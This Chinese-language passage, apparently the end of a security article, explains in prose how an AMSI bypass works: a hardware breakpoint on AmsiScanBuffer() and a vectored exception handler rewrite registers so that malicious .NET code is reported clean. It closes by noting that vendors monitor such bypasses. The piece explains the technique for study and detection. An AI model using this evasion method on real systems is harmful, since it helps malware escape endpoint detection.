当攻击者执行他们的 .NET 内联代码时，系统最终会调用 AmsiScanBuffer()，触发硬件断点并调用矢量异常处理程序。这个函数获取当前线程上下文，并更新寄存器以匹配当 AMSI 未检测到恶意内容时设置的值，即 0 (S-OK) 在 RAX 中，0 (AMSI_RESULT_CLEAN) 在 RSP+48 中。

此外，它从栈中提取返回地址（RSP），并将指令指针（RIP）指向 AmsiScanBuffer() 函数的调用者。接下来，它将栈指针回退到调用 AmsiScanBuffer() 之前的位置，清除硬件断点，并返回 EXCEPTION_CONTINUE_EXECUTION 代码。执行从断点处恢复。现在，Windows 将使用攻击者修改的线程上下文继续执行，将伪造的值传回给调用者，并允许恶意代码继续执行而不被发现。

## 结论

AMSI 是基于主机检测中的一个极为重要的组成部分。它与 PowerShell、.NET 和 Microsoft Office 等软件的集成意味着它在许多对抗活动中扮演了关键角色，从初步访问到后期利用。由于其在发布时对攻防作战的巨大影响，AMSI 曾经受到广泛研究。如今，AMSI 更加充当补充角色，因为几乎存在无数种规避策略。不过，厂商已经意识到这一点，并开始投入资源，监控常见的 AMSI 规避策略，然后将这些作为对抗活动的指示器。
